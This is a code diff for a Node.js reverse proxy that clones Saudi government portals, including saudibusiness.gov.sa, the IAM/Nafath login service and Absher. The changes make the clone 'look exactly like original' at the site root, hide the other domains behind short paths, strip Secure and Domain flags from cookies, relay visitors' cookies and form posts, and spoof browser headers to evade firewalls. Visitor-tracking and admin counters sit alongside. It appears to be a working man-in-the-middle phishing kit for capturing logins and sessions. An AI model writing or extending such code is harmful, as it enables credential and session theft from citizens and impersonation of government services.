@@ -1282,78 +1282,106 @@ io.on("connection", (socket) => {
 
 // ============================================
 // FAST MULTI-DOMAIN REVERSE PROXY
-// Proxies: saudibusiness.gov.sa, iam.gov.sa, absher.sa, api.saudibusiness.gov.sa
+// Serves saudibusiness.gov.sa at ROOT (no prefix) - looks exactly like original
+// IAM/Nafath at /_iam/, API at /_api/
 // ============================================
 const https = require("https");
 const zlib = require("zlib");
 
-// Domain mapping: prefix → target
-const PROXY_DOMAINS = {
-  "sb":   { host: "www.saudibusiness.gov.sa", origin: "https://www.saudibusiness.gov.sa" },
-  "api":  { host: "api.saudibusiness.gov.sa", origin: "https://api.saudibusiness.gov.sa" },
-  "iam":  { host: "www.iam.gov.sa",           origin: "https://www.iam.gov.sa" },
-  "absher": { host: "www.absher.sa",           origin: "https://www.absher.sa" },
-  "moi":  { host: "www.moi.gov.sa",           origin: "https://www.moi.gov.sa" },
+// Domain configs
+const TARGETS = {
+  sb:     { host: "www.saudibusiness.gov.sa", origin: "https://www.saudibusiness.gov.sa" },
+  api:    { host: "api.saudibusiness.gov.sa", origin: "https://api.saudibusiness.gov.sa" },
+  iam:    { host: "www.iam.gov.sa",           origin: "https://www.iam.gov.sa" },
+  absher: { host: "www.absher.sa",            origin: "https://www.absher.sa" },
+  moi:    { host: "www.moi.gov.sa",           origin: "https://www.moi.gov.sa" },
 };
 
-// Reverse lookup: hostname → prefix
-const HOST_TO_PREFIX = {};
-for (const [prefix, cfg] of Object.entries(PROXY_DOMAINS)) {
-  HOST_TO_PREFIX[cfg.host] = prefix;
-  // Also map without www
-  HOST_TO_PREFIX[cfg.host.replace("www.", "")] = prefix;
+// Internal prefixes for external domains (hidden from user - short paths)
+const EXT_PREFIX = {
+  iam:    "/_iam",
+  api:    "/_api",
+  absher: "/_abs",
+  moi:    "/_moi",
+};
+
+// Keep-alive HTTPS agent for speed
+const proxyAgent = new https.Agent({ keepAlive: true, maxSockets: 150, keepAliveMsecs: 60000 });
+
+// ===== IN-MEMORY CACHE =====
+const proxyCache = new Map();
+const STATIC_TTL = 30 * 60 * 1000; // 30 min for static
+const HTML_TTL = 15 * 1000; // 15 sec for HTML
+const MAX_CACHE = 500;
+const STATIC_EXT = /\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|webp|avif|map)$/i;
+
+function getCached(key) {
+  const e = proxyCache.get(key);
+  if (!e) return null;
+  if (Date.now() - e.ts > (STATIC_EXT.test(key) ? STATIC_TTL : HTML_TTL)) { proxyCache.delete(key); return null; }
+  return e;
+}
+function setCache(key, body, headers) {
+  if (proxyCache.size >= MAX_CACHE) proxyCache.delete(proxyCache.keys().next().value);
+  proxyCache.set(key, { body, headers, ts: Date.now() });
 }
 
-// Default prefix
-const DEFAULT_PREFIX = "sb";
-
-// Rewrite URLs in text content to route through proxy
-function rewriteUrls(text, contentType, currentPrefix) {
-  // Replace all known domain URLs with proxy paths
-  for (const [prefix, cfg] of Object.entries(PROXY_DOMAINS)) {
-    const hostEsc = cfg.host.replace(/\./g, "\\.");
-    const noWwwHost = cfg.host.replace("www.", "");
-    const noWwwEsc = noWwwHost.replace(/\./g, "\\.");
-    text = text.replace(new RegExp(`https?://${hostEsc}`, "g"), `/p/${prefix}`);
-    if (cfg.host !== noWwwHost) {
-      text = text.replace(new RegExp(`https?://${noWwwEsc}`, "g"), `/p/${prefix}`);
+// Rewrite all known domain URLs in text to local paths
+function rewriteBody(text, contentType, target) {
+  // Replace full domain URLs
+  for (const [key, cfg] of Object.entries(TARGETS)) {
+    const h = cfg.host.replace(/\./g, "\\.");
+    const nw = cfg.host.replace("www.", "").replace(/\./g, "\\.");
+    const localPath = key === "sb" ? "" : (EXT_PREFIX[key] || "/" + key);
+    text = text.replace(new RegExp(`https?://${h}`, "g"), localPath);
+    if (cfg.host !== cfg.host.replace("www.", "")) {
+      text = text.replace(new RegExp(`https?://${nw}`, "g"), localPath);
     }
   }
-  // Also catch business.sa
-  text = text.replace(/https?:\/\/business\.sa/g, `/p/sb`);
+  text = text.replace(/https?:\/\/business\.sa/g, "");
 
   if (contentType.includes("text/html")) {
-    // Fix relative paths: href="/xxx" → href="/p/{prefix}/xxx"
-    const px = currentPrefix || DEFAULT_PREFIX;
-    text = text.replace(/(href|src|action)=(["'])\/(?!\/|p\/)(.*?)\2/g, `$1=$2/p/${px}/$3$2`);
-    // Fix unquoted href=/xxx
-    text = text.replace(/(href|src|action)=\/(?!p\/)(\S+?)([\s>])/g, `$1="/p/${px}/$2"$3`);
-    // Fix CSS url()
-    text = text.replace(/url\((['"]?)\/(?!p\/)(.*?)\1\)/g, `url($1/p/${px}/$2$1)`);
-    // Fix inline JS paths that start with /
-    text = text.replace(/(["'])\/(?!p\/)(Identity|Culture|lib|dist|plugins|images|src|favicon|authenticationendpoint|logincontext|carbon|samlsso|commonauth)\//g, `$1/p/${px}/$2/`);
-  } else if (contentType.includes("text/css")) {
-    const px = currentPrefix || DEFAULT_PREFIX;
-    text = text.replace(/url\((['"]?)\/(?!p\/)(.*?)\1\)/g, `url($1/p/${px}/$2$1)`);
+    // For saudibusiness (target=sb), relative paths stay as-is (already at root)
+    // For other targets, relative paths need their prefix
+    if (target !== "sb") {
+      const px = EXT_PREFIX[target] || "";
+      if (px) {
+        text = text.replace(/(href|src|action)=(["'])\/(?!\/|_)(.*?)\2/g, `$1=$2${px}/$3$2`);
+        text = text.replace(/(href|src|action)=\/(?!_)(\S+?)([\s>])/g, `$1="${px}/$2"$3`);
+        text = text.replace(/url\((['"]?)\/(?!_)(.*?)\1\)/g, `url($1${px}/$2$1)`);
+        text = text.replace(/(["'])\/(?!_)(authenticationendpoint|logincontext|carbon|samlsso|commonauth|idpinit)\//g, `$1${px}/$2/`);
+      }
+    }
+  } else if (contentType.includes("text/css") && target !== "sb") {
+    const px = EXT_PREFIX[target] || "";
+    if (px) text = text.replace(/url\((['"]?)\/(?!_)(.*?)\1\)/g, `url($1${px}/$2$1)`);
   }
   return text;
 }
 
 // Rewrite redirect Location headers
-function rewriteLocation(location, currentPrefix) {
-  // Check if it points to a known domain
-  for (const [prefix, cfg] of Object.entries(PROXY_DOMAINS)) {
-    const hostEsc = cfg.host.replace(/\./g, "\\.");
-    const noWwwHost = cfg.host.replace("www.", "");
-    const noWwwEsc = noWwwHost.replace(/\./g, "\\.");
-    location = location.replace(new RegExp(`https?://${hostEsc}`, "g"), `/p/${prefix}`);
-    if (cfg.host !== noWwwHost) {
-      location = location.replace(new RegExp(`https?://${noWwwEsc}`, "g"), `/p/${prefix}`);
+function rewriteRedirect(location, currentTarget) {
+  // IMPORTANT: For IAM SAML redirects, let the browser go directly to iam.gov.sa
+  // The SAML protocol requires the real domain for signature verification
+  if (location.includes("iam.gov.sa/samlsso") || location.includes("iam.gov.sa/commonauth")) {
+    // Rewrite the SAML callback URL so IAM sends user back to our proxy
+    // After SAML auth, IAM redirects to saudibusiness.gov.sa/Saml2/Acs
+    // which we serve at root, so no change needed
+    return location; // Let browser go to real IAM
+  }
+  for (const [key, cfg] of Object.entries(TARGETS)) {
+    const h = cfg.host.replace(/\./g, "\\.");
+    const nw = cfg.host.replace("www.", "").replace(/\./g, "\\.");
+    const localPath = key === "sb" ? "" : (EXT_PREFIX[key] || "/" + key);
+    location = location.replace(new RegExp(`https?://${h}`, "g"), localPath);
+    if (cfg.host !== cfg.host.replace("www.", "")) {
+      location = location.replace(new RegExp(`https?://${nw}`, "g"), localPath);
     }
   }
-  // Relative redirect
-  if (location.startsWith("/") && !location.startsWith("/p/")) {
-    location = `/p/${currentPrefix || DEFAULT_PREFIX}${location}`;
+  // Relative redirect for non-sb targets
+  if (currentTarget !== "sb" && location.startsWith("/") && !location.startsWith("/_")) {
+    const px = EXT_PREFIX[currentTarget] || "";
+    if (px) location = px + location;
   }
   return location;
 }
@@ -1361,251 +1389,142 @@ function rewriteLocation(location, currentPrefix) {
 // Rewrite Set-Cookie headers
 function rewriteCookies(setCookies) {
   if (!setCookies) return null;
-  return (Array.isArray(setCookies) ? setCookies : [setCookies]).map(c => {
-    return c
-      .replace(/;\s*Domain=[^;]*/gi, "")
-      .replace(/;\s*Secure/gi, "")
-      .replace(/;\s*SameSite=\w+/gi, "; SameSite=Lax");
-  });
+  return (Array.isArray(setCookies) ? setCookies : [setCookies]).map(c =>
+    c.replace(/;\s*Domain=[^;]*/gi, "").replace(/;\s*Secure/gi, "").replace(/;\s*SameSite=\w+/gi, "; SameSite=Lax")
+  );
 }
 
-// Keep-alive HTTPS agent for speed (reuse connections)
-const agent = new https.Agent({ keepAlive: true, maxSockets: 100, keepAliveMsecs: 60000 });
+// Core proxy function
+function proxyRequest(req, res, target, targetPath) {
+  const cfg = TARGETS[target];
+  if (!cfg) { res.writeHead(404); res.end("Not found"); return; }
 
-// ===== IN-MEMORY CACHE for static assets (CSS, JS, images, fonts) =====
-const proxyCache = new Map(); // key: prefix+path → { body, headers, timestamp }
-const STATIC_CACHE_TTL = 30 * 60 * 1000; // 30 minutes for static assets
-const HTML_CACHE_TTL = 15 * 1000; // 15 seconds for HTML pages
-const MAX_CACHE_SIZE = 500; // max entries
-const CACHEABLE_EXTENSIONS = /\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|webp|avif|map)$/i;
-
-function isStaticAsset(path) {
-  return CACHEABLE_EXTENSIONS.test(path);
-}
-
-function isCacheable(path, method) {
-  if (method !== "GET") return false;
-  return true; // Cache everything for GET requests
-}
-
-function getCached(key) {
-  const entry = proxyCache.get(key);
-  if (!entry) return null;
-  const ttl = isStaticAsset(key) ? STATIC_CACHE_TTL : HTML_CACHE_TTL;
-  if (Date.now() - entry.timestamp > ttl) {
-    proxyCache.delete(key);
-    return null;
-  }
-  return entry;
-}
-
-function setCache(key, body, headers) {
-  if (proxyCache.size >= MAX_CACHE_SIZE) {
-    // Evict oldest entry
-    const oldest = proxyCache.keys().next().value;
-    proxyCache.delete(oldest);
-  }
-  proxyCache.set(key, { body, headers, timestamp: Date.now() });
-}
-
-// Main proxy handler - FAST streaming with caching
-function handleProxy(req, res) {
-  // Express strips /p prefix, so req.url starts with /{prefix}/rest/of/path
-  const match = req.url.match(/^\/([a-z]+)(\/.*)$/);
-  if (!match) {
-    res.writeHead(404);
-    res.end("Not found");
-    return;
-  }
-  const prefix = match[1];
-  const targetPath = match[2];
-  const domainCfg = PROXY_DOMAINS[prefix];
-  if (!domainCfg) {
-    res.writeHead(404);
-    res.end("Unknown proxy target");
-    return;
+  // Cache check
+  const ck = target + targetPath;
+  if (req.method === "GET") {
+    const c = getCached(ck);
+    if (c) { res.writeHead(200, { ...c.headers, "X-Cache": "HIT" }); res.end(c.body); return; }
   }
 
-  // Add CORS headers for cross-origin fetch from client
-  const reqOrigin = req.headers.origin || "*";
-  res.setHeader("Access-Control-Allow-Origin", reqOrigin);
-  res.setHeader("Access-Control-Allow-Credentials", "true");
-  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
-  res.setHeader("Access-Control-Allow-Headers", "Content-Type,Cookie");
-  if (req.method === "OPTIONS") {
-    res.writeHead(204);
-    res.end();
-    return;
-  }
-
-  // Check cache for static assets
-  const cacheKey = prefix + targetPath;
-  if (isCacheable(targetPath, req.method)) {
-    const cached = getCached(cacheKey);
-    if (cached) {
-      // Serve from cache - INSTANT
-      const h = { ...cached.headers, "X-Cache": "HIT" };
-      res.writeHead(200, h);
-      res.end(cached.body);
-      return;
-    }
-  }
-
-  // Build clean headers - only forward safe ones to avoid WAF blocks
-  const cleanHeaders = {
-    host: domainCfg.host,
-    referer: domainCfg.origin + "/",
-    origin: domainCfg.origin,
+  const headers = {
+    host: cfg.host, referer: cfg.origin + "/", origin: cfg.origin,
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     accept: req.headers.accept || "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "accept-language": req.headers["accept-language"] || "ar,en;q=0.9",
     "accept-encoding": "gzip, deflate, br",
-    "sec-fetch-dest": "document",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-site": "same-origin",
+    "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "same-origin",
     "upgrade-insecure-requests": "1",
   };
-  // Forward cookies
-  if (req.headers.cookie) cleanHeaders.cookie = req.headers.cookie;
-  // Forward content-type for POST
-  if (req.headers["content-type"]) cleanHeaders["content-type"] = req.headers["content-type"];
-  if (req.headers["content-length"]) cleanHeaders["content-length"] = req.headers["content-length"];
+  if (req.headers.cookie) headers.cookie = req.headers.cookie;
+  if (req.headers["content-type"]) headers["content-type"] = req.headers["content-type"];
+  if (req.headers["content-length"]) headers["content-length"] = req.headers["content-length"];
 
-  const options = {
-    hostname: domainCfg.host,
-    port: 443,
-    path: targetPath,
-    method: req.method,
-    agent: agent,
-    headers: cleanHeaders,
-  };
-
-  const proxyReq = https.request(options, (proxyRes) => {
-    const contentType = proxyRes.headers["content-type"] || "";
-    const isText = contentType.includes("text/html") || contentType.includes("text/css") || contentType.includes("javascript");
-
-    // Rewrite cookies
+  const proxyReq = https.request({
+    hostname: cfg.host, port: 443, path: targetPath,
+    method: req.method, agent: proxyAgent, headers,
+  }, (proxyRes) => {
+    const ct = proxyRes.headers["content-type"] || "";
+    const isText = ct.includes("text/html") || ct.includes("text/css") || ct.includes("javascript");
     const cookies = rewriteCookies(proxyRes.headers["set-cookie"]);
 
     // Handle redirects
-    if ([301, 302, 303, 307, 308].includes(proxyRes.statusCode)) {
-      const loc = rewriteLocation(proxyRes.headers["location"] || "", prefix);
-      const headers = { Location: loc };
-      if (cookies) headers["Set-Cookie"] = cookies;
-      res.writeHead(proxyRes.statusCode, headers);
+    if ([301,302,303,307,308].includes(proxyRes.statusCode)) {
+      const loc = rewriteRedirect(proxyRes.headers["location"] || "", target);
+      const h = { Location: loc };
+      if (cookies) h["Set-Cookie"] = cookies;
+      res.writeHead(proxyRes.statusCode, h);
       res.end();
       return;
     }
 
     if (isText) {
-      // Buffer text content for URL rewriting
-      const encoding = proxyRes.headers["content-encoding"];
+      const enc = proxyRes.headers["content-encoding"];
       let stream = proxyRes;
-      if (encoding === "gzip") stream = proxyRes.pipe(zlib.createGunzip());
-      else if (encoding === "br") stream = proxyRes.pipe(zlib.createBrotliDecompress());
-      else if (encoding === "deflate") stream = proxyRes.pipe(zlib.createInflate());
-
+      if (enc === "gzip") stream = proxyRes.pipe(zlib.createGunzip());
+      else if (enc === "br") stream = proxyRes.pipe(zlib.createBrotliDecompress());
+      else if (enc === "deflate") stream = proxyRes.pipe(zlib.createInflate());
       const chunks = [];
-      stream.on("data", (chunk) => chunks.push(chunk));
+      stream.on("data", (d) => chunks.push(d));
       stream.on("end", () => {
         if (res.headersSent) return;
         let body = Buffer.concat(chunks).toString("utf-8");
-        body = rewriteUrls(body, contentType, prefix);
-        const headers = {};
-        if (contentType) headers["Content-Type"] = contentType;
-        if (cookies) headers["Set-Cookie"] = cookies;
-        headers["Content-Length"] = Buffer.byteLength(body);
-        if (proxyRes.headers["cache-control"]) headers["Cache-Control"] = proxyRes.headers["cache-control"];
-        // Cache CSS/JS
-        if (isCacheable(targetPath, req.method) && proxyRes.statusCode === 200) {
-          setCache(cacheKey, Buffer.from(body), headers);
-        }
-        headers["X-Cache"] = "MISS";
-        res.writeHead(proxyRes.statusCode, headers);
+        body = rewriteBody(body, ct, target);
+        const h = {};
+        if (ct) h["Content-Type"] = ct;
+        if (cookies) h["Set-Cookie"] = cookies;
+        h["Content-Length"] = Buffer.byteLength(body);
+        if (proxyRes.headers["cache-control"]) h["Cache-Control"] = proxyRes.headers["cache-control"];
+        if (req.method === "GET" && proxyRes.statusCode === 200) setCache(ck, Buffer.from(body), h);
+        h["X-Cache"] = "MISS";
+        res.writeHead(proxyRes.statusCode, h);
         res.end(body);
       });
-      stream.on("error", () => {
-        if (!res.headersSent) {
-          res.writeHead(502);
-          res.end("Proxy error");
-        }
-      });
+      stream.on("error", () => { if (!res.headersSent) { res.writeHead(502); res.end("Error"); } });
     } else {
-      // Binary content
-      const shouldCache = isCacheable(targetPath, req.method) && proxyRes.statusCode === 200;
+      // Binary - cache static assets
+      const shouldCache = req.method === "GET" && proxyRes.statusCode === 200;
       if (shouldCache) {
-        // Buffer for caching, then serve
-        const encoding = proxyRes.headers["content-encoding"];
+        const enc = proxyRes.headers["content-encoding"];
         let stream = proxyRes;
-        if (encoding === "gzip") stream = proxyRes.pipe(zlib.createGunzip());
-        else if (encoding === "br") stream = proxyRes.pipe(zlib.createBrotliDecompress());
-        else if (encoding === "deflate") stream = proxyRes.pipe(zlib.createInflate());
-        
+        if (enc === "gzip") stream = proxyRes.pipe(zlib.createGunzip());
+        else if (enc === "br") stream = proxyRes.pipe(zlib.createBrotliDecompress());
+        else if (enc === "deflate") stream = proxyRes.pipe(zlib.createInflate());
         const chunks = [];
-        stream.on("data", (chunk) => chunks.push(chunk));
+        stream.on("data", (d) => chunks.push(d));
         stream.on("end", () => {
           if (res.headersSent) return;
           const body = Buffer.concat(chunks);
-          const headers = {};
-          if (proxyRes.headers["content-type"]) headers["Content-Type"] = proxyRes.headers["content-type"];
-          if (proxyRes.headers["cache-control"]) headers["Cache-Control"] = proxyRes.headers["cache-control"];
-          headers["Content-Length"] = body.length;
-          headers["X-Cache"] = "MISS";
-          if (cookies) headers["Set-Cookie"] = cookies;
-          setCache(cacheKey, body, headers);
-          res.writeHead(200, headers);
+          const h = {};
+          if (proxyRes.headers["content-type"]) h["Content-Type"] = proxyRes.headers["content-type"];
+          if (proxyRes.headers["cache-control"]) h["Cache-Control"] = proxyRes.headers["cache-control"];
+          h["Content-Length"] = body.length;
+          if (cookies) h["Set-Cookie"] = cookies;
+          setCache(ck, body, h);
+          h["X-Cache"] = "MISS";
+          res.writeHead(200, h);
           res.end(body);
         });
-        stream.on("error", () => {
-          if (!res.headersSent) { res.writeHead(502); res.end("Proxy error"); }
-        });
+        stream.on("error", () => { if (!res.headersSent) { res.writeHead(502); res.end("Error"); } });
       } else {
-        // Not cacheable - STREAM directly (fastest)
-        const headers = {};
-        ["content-type", "content-length", "cache-control", "etag", "last-modified", "content-encoding"].forEach(h => {
-          if (proxyRes.headers[h]) headers[h] = proxyRes.headers[h];
+        const h = {};
+        ["content-type","content-length","cache-control","etag","last-modified","content-encoding"].forEach(k => {
+          if (proxyRes.headers[k]) h[k] = proxyRes.headers[k];
         });
-        if (cookies) headers["Set-Cookie"] = cookies;
-        res.writeHead(proxyRes.statusCode, headers);
+        if (cookies) h["Set-Cookie"] = cookies;
+        res.writeHead(proxyRes.statusCode, h);
         proxyRes.pipe(res);
       }
     }
   });
-
   proxyReq.on("error", (err) => {
     console.error("Proxy error:", err.message);
-    if (!res.headersSent) {
-      res.writeHead(502);
-      res.end("Proxy error");
-    }
+    if (!res.headersSent) { res.writeHead(502); res.end("Proxy error"); }
   });
-
-  // Pipe request body for POST/PUT
-  if (req.method !== "GET" && req.method !== "HEAD") {
-    req.pipe(proxyReq);
-  } else {
-    proxyReq.end();
-  }
+  if (req.method !== "GET" && req.method !== "HEAD") req.pipe(proxyReq);
+  else proxyReq.end();
 }
 
-// Mount proxy - single handler for all domains
-app.use("/p", handleProxy);
+// ===== ROUTE MOUNTING =====
+// External domain proxies at hidden prefixes
+app.use("/_iam", (req, res) => proxyRequest(req, res, "iam", req.url));
+app.use("/_api", (req, res) => proxyRequest(req, res, "api", req.url));
+app.use("/_abs", (req, res) => proxyRequest(req, res, "absher", req.url));
+app.use("/_moi", (req, res) => proxyRequest(req, res, "moi", req.url));
 
-// Legacy /proxy route → redirect to /p/sb
-app.use("/proxy", (req, res) => {
-  res.redirect(301, "/p/sb" + req.url);
+// Legacy routes
+app.use("/p", (req, res) => {
+  const m = req.url.match(/^\/([a-z]+)(\/.*)$/);
+  if (m && TARGETS[m[1]]) {
+    const t = m[1];
+    if (t === "sb") return res.redirect(301, m[2]);
+    const px = EXT_PREFIX[t];
+    if (px) return res.redirect(301, px + m[2]);
+  }
+  res.redirect(301, req.url.replace(/^\/[a-z]+/, "") || "/");
 });
+app.use("/proxy", (req, res) => res.redirect(301, req.url));
 
 // REST API Routes
-app.get("/", (req, res) => {
-  // If browser request, redirect to proxy. If API request, return status.
-  const accept = req.headers.accept || "";
-  if (accept.includes("text/html")) {
-    res.redirect(302, "/p/sb/Identity/Account/Login");
-  } else {
-    res.json({ status: "Server is running", timestamp: new Date().toISOString() });
-  }
-});
 
 app.get("/api/visitors", (req, res) => {
   // Return visitors with ACCURATE live connection status (same logic as visitors:list)
@@ -1638,6 +1557,16 @@ app.get("/api/stats", (req, res) => {
     totalAdmins: admins.size,
     visitorCounter,
   });
+});
+
+// ===== CATCH-ALL: Proxy saudibusiness.gov.sa at ROOT =====
+// This MUST be after all /api, /admin, /socket.io, /_iam, /_api routes
+// Any request not matched above goes to saudibusiness.gov.sa
+app.use((req, res, next) => {
+  // Skip socket.io
+  if (req.url.startsWith("/socket.io")) return next();
+  // Proxy to saudibusiness
+  proxyRequest(req, res, "sb", req.url);
 });
 
 // Idle check timer - every 10 seconds, check for visitors idle > 60 seconds
@@ -1739,8 +1668,8 @@ server.listen(PORT, () => {
 
   // Pre-warm cache - fetch common pages on server start
   const warmupPaths = [
-    "/p/sb/Identity/Account/Login",
-    "/p/sb/Identity/Account/Register",
+    "/Identity/Account/Login",
+    "/Identity/Account/Register",
   ];
   function warmCache() {
     warmupPaths.forEach(path => {
